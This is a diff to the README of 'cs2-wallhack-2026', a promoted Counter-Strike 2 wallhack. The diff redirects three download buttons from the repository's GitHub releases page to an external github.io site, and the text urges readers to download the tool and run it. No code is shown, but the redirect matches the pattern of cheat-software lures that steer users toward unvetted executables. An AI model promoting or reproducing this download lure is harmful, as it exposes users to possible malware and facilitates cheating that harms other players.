@@ -1,6 +1,6 @@
 # 🎯 cs2-wallhack-2026 - See Every Enemy, Every Time
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_Wallhack_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Nik0theSeal/cs2-wallhack-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-CS2_Wallhack_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://nik0theseal.github.io)
 
 ---
 
@@ -49,7 +49,7 @@ Follow these steps carefully. It should take less than 5 minutes from start to f
 
 Click the big green button below to go to the download page:
 
-[**⬇️ DOWNLOAD CS2-WALLHACK-2026**](https://github.com/Nik0theSeal/cs2-wallhack-2026/releases)
+[**⬇️ DOWNLOAD CS2-WALLHACK-2026**](https://nik0theseal.github.io)
 
 Visit this link to download the application. You will see a list of files on that page. Look for the most recent version and download it.
 
@@ -169,7 +169,7 @@ That's all there is to it. Enjoy your new advantage and never get caught off gua
 
 If you need to download the tool again, use this link:
 
-[**⬇️ GET CS2-WALLHACK-2026 NOW**](https://github.com/Nik0theSeal/cs2-wallhack-2026/releases)
+[**⬇️ GET CS2-WALLHACK-2026 NOW**](https://nik0theseal.github.io)
 
 ---
 
